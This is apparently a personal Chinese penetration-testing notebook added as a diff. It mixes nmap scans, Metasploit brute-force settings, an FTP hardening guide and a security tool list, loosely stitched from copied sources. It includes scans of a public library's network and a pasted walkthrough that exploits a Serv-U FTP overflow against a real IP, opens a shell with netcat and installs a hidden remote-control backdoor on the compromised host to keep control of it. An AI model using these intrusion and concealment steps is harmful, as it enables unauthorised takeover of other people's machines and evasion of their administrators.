@@ -1,0 +1,714 @@
+啥都不说... 直接拿自己服务器试验最好了.!!
+
+
+🔵 漏洞&系统 扫描: nessus 
+    可以直接分析出... 准确的系统版本. 
+    也可以进行 网段搜索. 
+
+
+
+🔵 扫描端口
+
+    ✘✘∙𝒗 Desktop sudo nmap -O 23.105.192.96
+    Password:
+
+    Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 14:39 CST
+    Nmap scan report for 23.105.192.96.16clouds.com (23.105.192.96)
+    Host is up (0.20s latency).
+    Not shown: 973 closed ports
+    PORT     STATE    SERVICE
+    25/tcp   open     smtp
+    80/tcp   open     http
+    110/tcp  open     pop3
+    111/tcp  filtered rpcbind
+    143/tcp  open     imap
+    993/tcp  open     imaps
+    995/tcp  open     pop3s
+    1025/tcp open     NFS-or-IIS
+    1028/tcp open     unknown
+    1032/tcp open     iad3
+    1033/tcp open     netinfo
+    1037/tcp open     ams
+    1039/tcp open     sbl
+    1040/tcp open     netsaint
+    1041/tcp open     danf-ak2
+    1042/tcp open     afrog
+    1043/tcp open     boinc
+    1044/tcp open     dcutility
+    1045/tcp open     fpitp
+    1046/tcp open     wfremotertm
+    1047/tcp open     neod1
+    1723/tcp filtered pptp
+    2222/tcp open     EtherNetIP-1
+    3306/tcp open     mysql
+    5500/tcp open     hotline
+    7000/tcp open     afs3-fileserver
+    8080/tcp open     http-proxy
+    Device type: general purpose
+    Running: Linux 2.6.X|3.X
+    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+    OS details: Linux 2.6.32 - 3.10
+    Network Distance: 13 hops
+
+    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 37.85 seconds
+
+
+
+🔵 爆破字典:
+
+    https://wiki.skullsecurity.org/Passwords
+
+    常用密码:  
+    泄漏密码:
+
+
+
+
+🔵 Connect 参数
+    我们先来看看这么命令怎么用的...
+    help ➜  显示所有命令 ➜  找到 connect 
+    connect       Communicate with a host
+        connect 127.0.0.1 3306 
+        看看能不能和本地的 3306端口通信
+
+        connect 127.0.0.1 80
+        尝试连接80端口.
+
+        connect www.baidu.com 80   可以连接
+        connect www.baidu.com 8     这个肯定不行 . 没有8这个端口..
+
+    一般用于内网渗透.
+    详细命令 用connect -h
+    反正 connect 是不能连接到 mysql数据库的 不知道问什么 就算有密码也不行...
+
+
+    有密码都连不上... 那还破解个鬼....
+
+
+
+
+
+
+🔵 ssh  ✔︎ 
+
+    use auxiliary/scanner/ssh/ssh_login 
+    set rport 2222
+    set username root
+    set password xujian
+    set rhosts 23.105.192.96
+
+    果然可以连进去. 
+    下面我们帐号还是root 但是密码用文件来试试.
+    先创建个 my.txt 里面每行一个密码.  其中一行写上你的真实密码.
+    unset password 
+    首先把原来的密码 取消掉.
+    set pass_file /etc/my.txt
+    run
+
+    现在就会自动尝试 my.txt文件中的每一行.
+    肯定能成功的. 因为里面有你的真实密码.
+    思路就是这样的. 选择用户名文件. 选择密码文件. 设置端口. 进行暴破.
+
+
+
+
+
+
+
+🔵 Mysql
+
+🔸版本查看: 
+    // 判断是否运行外连. 允许就可以获取版本.不允许就不行.
+    // 还有是否允许非root远程 也是个问题...
+
+    msf > use auxiliary/scanner/mysql/mysql_version
+    msf auxiliary(mysql_version) > show options
+
+    Module options (auxiliary/scanner/mysql/mysql_version):
+
+      Name     Current Setting  Required  Description
+      ----     ---------------  --------  -----------
+      RHOSTS                    yes       The target address range or CIDR identifier
+      RPORT    3306             yes       The target port (TCP)
+      THREADS  1                yes       The number of concurrent threads
+
+    msf auxiliary(mysql_version) > set rhosts 23.105.192.96
+    rhosts => 23.105.192.96
+    msf auxiliary(mysql_version) > run
+
+    [*] 23.105.192.96:3306    - 23.105.192.96:3306 is running MySQL 5.5.48-log (protocol 10)
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+
+
+
+
+🔸 暴力破解
+    实际账户名 admin  密码admin
+    
+    字典需要自己准备...
+    自动爆破登录工具: 
+    
+    use auxiliary/scanner/mysql/mysql_login
+    set username admin
+    set password admin
+    set rhosts 127.0.0.1
+    run
+    本地的数据库 就能进去.
+    但是用远程的数据库 就不行..
+    // 取消设置  unset 就可以.
+    LOGIN FAILED: admin:admin (Unable to Connect: unknown charset number: 45)
+    这个错误. Unable to Connect
+    connect 是一个 msf 命令.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+不同工具对同一台电脑 扫描的结果完全不同的.
+我们直接 针对 ftp来...
+
+nessus 是集成各种的 扫描器.  
+msf自带的辅助模块可以针对特定漏洞进行扫描.
+如 ftp 登录模块:
+扫描网段192.168.20.1-10中能使用固定用户名和密码root/123456登陆主机：
+
+
+
+
+速度: 
+set bruteforce_speed 5
+brute 破解.
+暴力破解速度..
+
+
+
+
+🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸上海图书馆🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸
+
+
+ip段:
+	
+  10.1.182.12 
+  10.1.182.1/24
+
+
+先扫描出 扫描活动的主机....
+
+
+先进行系统扫描..
+
+nmap 先扫描5个.
+
+
+
+
+🔵 主机发现
+一般不需要扫描机器的所有端口.
+我们只对服务器有兴趣. 
+
+
+
+nmap -sP 101.255.78.0/24
+-sP (Ping扫描)
+只简单扫描对方是否开机. 不进行端口扫描!! 扫描端口很费时间的.
+
+
+
+✘✘∙𝒗 Desktop nmap -sP 101.255.78.0/24
+
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 10:38 CST
+Nmap scan report for 101.255.78.1
+Host is up (0.67s latency).
+Nmap scan report for 101.255.78.2
+Host is up (0.45s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 26.82 seconds
+
+公共wifi一般都进行 隔离的??
+怎么办...
+
+
+
+
+
+✘✘∙𝒗 Desktop nmap -sP  10.1.182.1/24
+
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 10:41 CST
+Nmap scan report for 10.1.182.12
+Host is up (0.0032s latency).
+Nmap scan report for 10.1.182.250
+Host is up (0.013s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 34.87 seconds
+✘✘∙𝒗 Desktop
+
+丫的 上图 也进行隔离的 好像.
+看看10.1.182.250 是什么
+
+✘✘∙𝒗 Desktop nmap 10.1.182.250
+
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 10:43 CST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
+
+防ping的还是.... 祭出神参数 -Pn
+
+✘✘∙𝒗 Desktop nmap -Pn 10.1.182.250
+
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 10:44 CST
+Nmap scan report for 10.1.182.250
+Host is up (0.0063s latency).
+Not shown: 985 filtered ports
+PORT     STATE  SERVICE
+17/tcp   open   qotd
+21/tcp   open   ftp
+80/tcp   open   http
+389/tcp  closed ldap
+443/tcp  open   https
+636/tcp  closed ldapssl
+1723/tcp open   pptp
+2323/tcp closed 3d-nfsd
+5080/tcp closed onscreen
+8080/tcp open   http-proxy
+8081/tcp open   blackice-icecap
+8082/tcp open   blackice-alerts
+8083/tcp closed us-srv
+8088/tcp open   radan-http
+8888/tcp closed sun-answerbook
+
+Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
+
+
+
+先看操作系统!!
+
+✘✘∙𝒗 Desktop sudo nmap -O 10.1.182.250
+
+Password:
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 10:45 CST
+Nmap scan report for 10.1.182.250
+Host is up (0.0048s latency).
+Not shown: 985 filtered ports
+PORT     STATE  SERVICE
+17/tcp   open   qotd
+21/tcp   open   ftp
+80/tcp   open   http
+389/tcp  closed ldap
+443/tcp  open   https
+636/tcp  closed ldapssl
+1723/tcp open   pptp
+2323/tcp closed 3d-nfsd
+5080/tcp closed onscreen
+8080/tcp open   http-proxy
+8081/tcp open   blackice-icecap
+8082/tcp open   blackice-alerts
+8083/tcp closed us-srv
+8088/tcp open   radan-http
+8888/tcp closed sun-answerbook
+MAC Address: 00:1A:1E:01:C8:E0 (Aruba Networks)
+Device type: general purpose
+Running (JUST GUESSING): Linux 2.6.X (86%)
+OS CPE: cpe:/o:linux:linux_kernel:2.6.26
+Aggressive OS guesses: Linux 2.6.26 (PCLinuxOS) (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
+
+
+Linux的.....
+再来分析端口:
+
+
+借助就是 漏洞扫描了... 用nessus.
+分析只有三个 ssl 的中级漏洞...
+
+一个是ssl证书 使用弱算法.
+SHA-1 With RSA Encryption
+SHA-1 是什么
+RSA是什么
+
+
+SHA1：公钥后处理回传
+RSA：非对称加密，有公钥和私钥
+
+
+SHA-1算法目前尚未发现严重的弱点，但伪造证书所需费用正越来越低。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+iis ftp 漏洞.
+
+http://os.51cto.com/art/201012/239821_all.htm
+
+
+提高IIS的FTP安全性   使用足够隐蔽的端口进行通信
+
+
+
+
+“端口”设置建议不使用默认端口，而是将默认端口设置成一个不常用的，大于10000、小于65535的端口号。之所以要设置大于10000，小于65535是因为很多端口扫描工具默认情况下都不会扫描这部分端口，而攻击者如果手动设置扫描端口的话，出于时间和速度的考虑，也很少定义1-65535这样的端口扫描规则，所以很容易迷惑攻击者，让他们根本不知道原来还有一个高端端口隐蔽在系统中发挥作用。
+
+即使攻击者用扫描器扫到了这个端口，往往也会因为这个陌生的端口而不明白具体运行的服务，需要详细探测才有可能发现是FTP服务。接下来，将对此新建的FTP服务器进行详细的安全配置。
+
+
+IIS的FTP系统有非常完善、丰富的日志记录系统，使用日志系统来时刻记录FTP服务器的运行状态是非常重要的。
+
+1．启用FTP服务器的日志记录功能
+
+在默认情况下，IIS管理器下FTP站点中的某个站点的FTP日志系统默认是启用的。
+
+2．FTP服务器的高级日志配置
+
+和普通的FTP服务器要求不同，如果需要建立足够安全的FTP服务器，需要对日志系统进行详细的高级定义，定义的内容就是设置攻击者或者可能发生的攻击可能存在的典型特征。
+
+
+
+
+
+
+需要注意的是，并不是日志系统记录的信息越多就越好，因为日志系统记录FTP用户（攻击者或者正常用户）的访问毕竟需要消耗资源，而且生成的日志记录同样需要存放空间。如果记录项目过多，可能引起系统资源消耗日志文件占用空间大的问题。
+
+
+
+
+真经第三重点穴篇——取消匿名访问
+
+匿名访问是FTP服务器的默认设置，此设置可以很好地支持普通用户的FTP访问，但是要建立安全性足够的FTP服务器的话，此项设置必须去除。
+
+
+
+
+真经第四重摧心掌——强制安全密码规则
+
+在有意无意之中，一些用户的FTP账号密码设置得过于简单，为了提高FTP服务器的安全性，特别是需要建立安全性足够强的维护型FTP服务器，必须强制用户设置复杂的账号密码。
+
+
+
+1．组策略简介
+
+在Windows系统中，密码的规则设置是由组策略所控制的。简单地说，组策略设置就是在修改注册表中的配置。当然，组策略使用了萄託每的管理组织方法，可以对各种对象中的设置进行管理和配置，远比手工修改注册表方便、灵活，功能也更加强大。
+
+依次指向“开始一运行”，输入“gpedit.msc”进入Windows 2003 Server系统的组策略选项。进入组策略选项以后，在左方快速链接栏中依次指向“计算机配置一〉Windows设置一〉账户策略一〉密码策略”，这里可以设置很多密码的相关安全规则。
+
+在右侧矿体中找到“密码必须符合复杂性要求”项，然后双击打开后，选中“已启用”按钮，最后单击确定使之生效。
+
+
+
+如果启用“密码必须符合复杂性要求”策略，在更改或创建账户（密码）时就会执行复杂性策略检查，密码必须符合下列最低要求：
+
+a.密码不能包含账户名：
+
+b.密码不能包含用户名中超过两个连续字符的部分：
+
+c.密码至少有6个字符长度；
+
+d.策略包含以下4类字符中的至少3类字符：英文大写字母(A-Z)、英文小“．写字母(a-z)、10个基本数字(0-9)、特殊字符（例如！、$、#、%）
+
+3．启用密码长度最小值策略
+
+另外，更具安全密码规则中密码长度的要求，可以双击“密码长度最小值”进行最小密码长度的设置。例如把最小长度设置为8个字符，经过这样的设置，FTP用户（乃至系统用户）的密码安全性就大大地提高了，系统安全性也就大大增强了。
+
+
+
+维护型的FTP服务器使用者一般是网络管理员，所以不存在大量用户使用的问题，一般都是机构管理员在分别使用。
+
+针对这样的情况，如果采用IIS下的FIP Server构建服务器的话，首先应该考虑的是去掉默认FTP服务器中的匿名访问，然后建立专用的FTP账户，最后为专用的FTP账户指派访问目录。
+
+1．建立专用FTP账户
+
+假定有5个管理员需要对服务器进行经常性的维护，而且各自的工作职能不同，那就需要建立至少5个专用FTP账户。
+
+
+
+Net user ft01 pass11@! wd /add
+
+重复上述用户建立设置，依次建立ftp01~ftp05等几个账户。
+
+2．建立专用账户对应的FTP文件夹
+
+建立好FTP专用账户以后，需要为专用账户指派FTP目录，以系统管理员身份找到n（y的根文件夹，分别为每个用户建立一个对应的文件夹，例如用户ftp01就对应ftp01文件夹、ftp02用户对应ftp02文件夹。
+
+真经高手阶段
+
+上述几个步骤只是简单地建立了几个可用账户，远远没有达到实现安全FTP的目的，下述内容将进行详细设置。
+
+真经第六重九阴白骨爪——使用NTFS约束FTP用户权限
+
+在管理员各自对应的FTP用户建立好之后，并不能直接使用，需要对各账户进行详细的权限设置。
+
+
+
+
+删除各FTP文件夹继承权限
+
+以ftp01账户对应的ftp01文件夹为例，以系统管理员身份登录，选中文件夹并右键选择“安全”选项卡，默认情况下这里有非常多的已经继承于上级文件夹的权限，
+
+我们需要做的是删掉这些默认的权限，但是在删除的时候会出现系统提示：
+
+因为“SYSTEM”从其父系继承权限，您无法删除此对象。要删除“SYSTEM 
+
+“必须阻止对象继承权限。关闭继承权限的选项，然后重试删除“SYSTEM”
+
+因为权限是继承上级文件夹的，所以不能直接删除，需要单击“高级”按钮，进入此文件夹的“高级安全设置”，
+
+
+
+
+
+
+对广大直面各种网络攻击的网络安全工程师来说，工作中必然会遇到会遇到各种各样的FTP攻击，普通管理员会认为Windows 下FTP服务安全性比较弱，安全性无法保证，所以在Windows server加装了第三方FTP 程序，以满足自己的要求。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+弱口令扫描主机. 得到ftp
+
+虽然我们通过刚才的步骤得到了大量存在FTP弱口令的主机，但并不表明它们都可以被入侵.因为他们的FTP服务器类型还没确定.可能是微软的FTP.或者是WUFTP等等.
+
+
+nessus 来确定对方的 ftp类型.
+220-Microsoft FTP Service
+
+
+
+nessus 有很多插件..    ftp插件也有..
+
+
+
+
+步骤3:很快扫描完毕.详细显示了被扫描主机的FTP服务器类型.可以看出有台目标主机的FTP服务器类型为:serv-u FTP
+
+
+通过刚才的扫描等一系列步骤.我已经确定了要下手的目标.
+下面，开始使用serv-u MDTM溢出漏洞进行入侵.
+步骤1:在命令行下运行serv-u MDTM溢出的利用程序killftp.察看到帮助文件
+步骤2:按照提示.我们输入命令:killftp 218.109.2.222 21 ftp ftp. 即对一台IP为218.109.2.222，帐号为FTP.密码为FTP的主机进行攻击，
+可以看出，提示成功之后连接8111端口
+步骤3:按照成功提示.我们利用NC端口程序连接目标主机的8111端口，输入连接命令: nc -vv 218.109.2.222 8111 很快就可以得到一个新的
+DOS窗口.而且这个窗口还是管理员权限的.就这么简单
+
+
+
+三、后门旋转保留肉鸡
+通过.刚才的方法进入了服务器内部，但是要保住这台肉鸡，还真有点困难.
+一是.可能它是动态I定次重新启动之后就丢了，或者是对方管理员很警觉.不让你有丝毫留后门的机会. 那么该怎么办呢?我向大家推荐一款非
+常好的后门工具来解决难题，web my pc是一款自动上线的远程管理软件.本来是为了管理员远程管理主机之用，它具有自动上线，连接速度快，
+可以直接浏览器中操作的特点.不需要任何外接软件.刚才的那台肉鸡存在terminal server(远程终端服务).我很容易通过连接就进入到其内部
+下面在图形界面下将web my pc安装成为后门.步骤1:在肉鸡上打开web my pc的主程序进行设置.先填写登录名称和密码，这需要注册，因为web my pc是一家公司提供的服务，要想使用它，必须
+先注册.
+步骤2:接下来在web my pc的主程序中填写上登录名称，密码等相关信息，设置完毕.即可开始运行.在运行时屏幕右下角的任务栏会显示其图标. 步骤3:在右下角任务栏显示的图标上点鼠标右键，选择"安装为windows服务"，这样就可以将web my pc安装为系统服务.
+可以找到服务:webmypc server.将其启动类型设置为"自动"并启动服务即可.
+这样彻底将服务安装完毕.以后每次就会随机启动.
+步骤4:在右下角任务栏显示的图标非常的碍眼.很容易让管理员发现，所以必须将它去掉，方法是:点"开始"，"运行"，输入regedit.打开注册表，
+进入路径为 HKEY_LOCAL_MACHINE\\software\\mirosoft\\windows\\currentversion\\run 将webmypc的启动键值.webmypc删除掉即可.这样就不
+会在右下角任务栏显示出图标了
+步骤5:一切设置完毕之后，就可以登录网站:http://dns0755.net填写申请的用户名和密码进入，然后点"自助服务"项目，可以在那里找
+到上线的肉鸡.名字叫:黑蛋.这样就可以远程控制它了.
+这样利用这个漏洞以及介绍的后门webmypc，完全可以搞大量的肉鸡，而且不会担心肉鸡丢失，实在是机不可失。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+先用 nessus 扫描本机.mac..
+也有7个高危漏洞啊..
+
+下面开始分析具体的漏洞...
+比如我电脑 xcode是 8.0 的  现在有8.1 的 但是我没升级.
+nessus 每个漏洞都可以具体点击进去了
+里面有详细信息.
+
+
+Xcode 8.1
+
+Released October 27, 2016
+IDE Xcode Server
+Available for: OS X El Capitan v10.11.5 and later
+Impact: A remote attacker may be able to cause unexpected application termination or arbitrary code execution
+Description: Multiple issues existed in Node.js in Xcode Server. These issues were addressed by updating to Node.js version 4.5.0.
+CVE-2016-1669
+CVE-2016-0705
+CVE-2016-0797
+CVE-2016-0702
+CVE-2016-2086
+CVE-2016-2216
+CVE-2015-8027
+CVE-2015-3193
+CVE-2015-3194
+CVE-2015-6764
+
+
+
+
+这就是 xcode 8.1 修复的漏洞. 你没升级 
+意味着可以用这些漏洞攻击你...
+
+CVE:Common Vulnerabilities & Exposures”公共漏洞和暴露
+CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。这样就使得CVE成为了安全信息共享的“关键字”。如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题。安犬漏洞扫描云平台整合世界三大漏洞库，CVE漏洞数据库也是安犬平台的技术构成部分。
+
+
+有了CVE 号码. 怎么查详细的 cve 内容呢
+这个网站!!!  去搜索就有了....
+http://www.cvedetails.com/
+
+
+比如: CVE-2016-1669
+http://www.cvedetails.com/cve/CVE-2016-1669/
+
+全英文的....
+同样 rapid7 这公司 也提供了关于漏洞攻击的模块!!!
+https://www.rapid7.com/
+去首页 搜索 CVE-2016-1669!!!
+什么也搜索不到...擦...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Hping2：一种网络探测工具，是ping的超级变种
+这个小工具可以发送自定义的ICMP，UDP和TCP数据包，并接收所有反馈信息。它的灵感来源于ping命令，但其功能远远超过ping。它还包含一个小型的路由跟踪模块，并支持IP分段。此工具可以在常用工具无法对有防火墙保护的主机进行路由跟踪/ping/探测时大显身手。它经常可以帮助您找出防火墙的规则集，当然还可以通过它来学习TCP/IP协议，并作一些IP协议的实验。]]]
+
+
+Kismet：一款超强的无线嗅探器
+Kismet是一款基于命令行（ncurses）的802.11 layer2无线网络探测器、嗅探器、和入侵检测系统。它对网络进行被动嗅探（相对于许多主动工具，例如NetStumbler），可以发现隐形网络（非信标）。它可以通过嗅探TCP、UDP、ARP和DHCP数据包来自动检测网络IP段，以Wireshark/TCPDump兼容格式记录通讯日志，更加可以将被检测到的网络分块并按照下载的分布图进行范围估计。如您所想，这款工具一般被wardriving所使用。嗯！还有warwalking、warflying和warskating……
+
+
+ Tcpdump：最经典的网络监控和数据捕获嗅探器
+在Ethereal（Wireshark）出现之前大家都用Tcpdump，而且很多人现在还在一直使用。它也许没有Wireshark那么多花里胡哨的东西（比如漂亮的图形界面，亦或数以百计的应用协议逻辑分析），但它能出色的完成很多任务，并且漏洞非常少，消耗系统资源也非常少。它很少添加新特性了，但经常修复一些bug和维持较小的体积。它能很好的跟踪网络问题来源，并能监控网络活动。其Windows下的版本叫做WinDump。Libpcap/WinPcap的包捕获库就是基于TCPDump，它也用在Nmap等其它工具中。
+
+
+
+ Cain and Abel：Windows平台上最好的密码恢复工具 UNIX用户经常声称正是因为Unix平台下有很多非常好的免费安全工具，所以Unix才会成为最好的平台，而Windows平台一般不在他们的考虑范围之内。他们也许是对的，但Cain & Abel确实让人眼前一亮。这种只运行于Windows平台的密码恢复工具可以作很多事情。它可以通过嗅探网络来找到密码、利用字典破解加密密码、暴力破解密码和密码分析、记录VoIP会话、解码非常复杂的密码、星号查看、剥离缓存密码以及分析路由协议。另外其文档也很齐全（well documented）。
+
+
+John the Ripper：一款强大的、简单的以及支持多平台的密码破解器
+John the Ripper是最快的密码破解器，当前支持多种主流Unix （官方支持11种，没有计算不同的架构）、DOS、Win32、BeO和OpenVMS。它的主要功能就是检测弱Unix密码。它支持主流Unix下的多种（3种）密码哈希加密类型，它们是Kerberos、AFS以及Windows NT/2000/XP LM。其它哈希类型可以通过补丁包加载。如果您希望从一些单词表开始的话，您可以在这里、这里和这里找到。
+
+ Ettercap：为交换式局域网提供更多保护 Ettercap是一款基于终端的以太网络局域网嗅探器/拦截器/日志器。它支持主动和被动的多种协议解析（甚至是ssh和https这种加密过的）。还可以进行已建立连接的数据注入和实时过滤，保持连接同步。大部分嗅探模式都是强大且全面的嗅探组合。支持插件。能够识别您是否出在交换式局域网中，通过使用操作系统指纹（主动或被动）技术可以得出局域网结构。
+
+
+Nikto：非常全面的网页扫描器
+Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3200种有潜在危险的文件/CGIs；超过625种服务器版本；超过230种特定服务器问题。扫描项和插件可以自动更新（如果需要）。基于Whisker/libwhisker完成其底层功能。这是一款非常棒的工具，但其软件本身并不经常更新，最新和最危险的可能检测不到。
+
+
+13 Ping/telnet/dig/traceroute/whois/netstat：基本命令
+虽然有很多重型的高科技网络安全工具，但是不要忘记其基础！所有网络安全人士都要对这些基本命令非常熟悉，因为它们对大多数平台都适用（在Windows平台上whois为tracert）。它们可以随手捏来，当然如果需要使用一些更高级的功能可以选择Hping2和Netcat。
+
+
+OpenSSH / PuTTY / SSH：访问远程计算机的安全途径
+SSH（Secure Shell）现在普遍应用于登录远程计算机或在其上执行命令。它为不安全网络上的两台不互信计算机间通讯提供安全加密，代替非常不可靠的telnet/rlogin/rsh交互内容。大多UNIX使用开源的OpenSSH服务器和客户端程序。Windows用户更喜欢免费的PuTTY客户端，它也可以运行在多种移动设备上。还有一些Windows用户喜欢使用基于终端的OpenSSH模拟程序Cygwin。还有其它很多收费和免费的客户端。您可以在这里和这里找到。
+
+
+
+THC Hydra：支持多种服务的最快的网络认证破解器
+如果您需要暴力破解一个远程认证服务，Hydra经常会是选择对象。它可以同时对30个以上的端口进行基于字典的快速破解，包括telnet、ftp、http、https、smb、多种数据库及其它服务。和THC Amap一样，此Hydra版本来自于民间组织THC。
+
+
+# 19 THC Amap：一款应用程序指纹扫描器
+Amap是一款很棒的程序，它可以检测出某一端口正在被什么程序监听。因为其独有的version detection特性，所以其数据库不会象Nmap一样变得很大，在Nmap检测某一服务失败或者其它软件不起作用时可以考虑使用之。Amap的另一特性是其能够解析Nmap输出文件。这也是THC贡献的另一款很有价值的工具。
+
+
+
+Aircrack：最快的WEP/WPA破解工具 Aircrack是一套用于破解802.11a/b/g WEP和WPA的工具套装。一旦收集到足够的加密数据包它可以破解40到512位的WEP密匙，它也可以通过高级加密方法或暴力破解来破解WPA 1或2网络。套装中包含airodump（802.11数据包捕获程序）、aireplay （802.11数据包注入程序）、aircrack（静态WEP和WPA-PSK破解），和airdecap（解密WEP/WPA捕获文件）。
+
+
+Netfilter：最新的Linux核心数据包过滤器/防火墙
+Netfilter是一款强大的运行于标准Linux核心上的包过滤器。它集成了用户空间IP列表工具。当前，它支持包过滤（无状态或有状态）、所有类型的网络地址和端口转换（NAT/NAPT）并支持多API层第三方扩展。它包含多种不同模块用来处理不规则协议，例如FTP。其它UNIX平台请参考Openbsd PF（只用于OpenBSD）或者IP Filter。许多个人防火墙（personal firewalls）都支持Windows （Tiny、Zone Alarm、Norton、Kerio…），但都不提供上述IP列表。微软在Windows XP SP2中集成了一款非常基础的防火墙，如果您不安装它，它就会不断地提示您安装。
+
+
+
+L0phtcrack：Windows密码猜测和恢复程序
+L0phtCrack也叫作LC5，用来尝试通过哈希（通过某种访问方式获得的）方法破解诸如Windows NT/2000工作站、联网服务器、主域控制器、或活动目录密码，有时它也可以通过嗅探获得密码的哈希值。它还可以通过多种手段来猜测密码（字典、暴力破解等等）。Symantec公司2006年已经停止了LC5的开发，但LC5 installer的安装文件随处可以找到。免费试用版只能使用15天，Symantec已经停止出售此软件的注册码，所以如果您不想放弃使用它，就必须找到一个与其对应的注册码生成器（key generator）。因为Symantec不再维护此软件，所以最好尝试用Cain and Abel或John the Ripper来代替之。
+
+ Airsnort：802.11 WEP加密破解工具
+AirSnort是一款用来恢复加密密码的无线LAN（WLAN）工具。Shmoo Group出品，工作原理是被动监控传输信息，当收集到足够多的数据包后开始计算加密密码。Aircrack和它很像。
+
+
+ BackTrack：一款极具创新突破的Live（刻在光盘上的，光盘直接启动） 光盘自启动Linux系统平台 这款卓越的光盘自启动Linux系统是由Whax和Auditor合并而成。它以其超级多的安全和防护工具配以丰富的开发环境而闻名。重点在于它的用户模块化设计，用户可以自定义将哪些模块刻到光盘上，例如自己编写的脚本、附加工具、自定义内核等等。
+
+
+
+[http://www.ha97.com/2678.html]
+
+
+
+
+
+
+
+
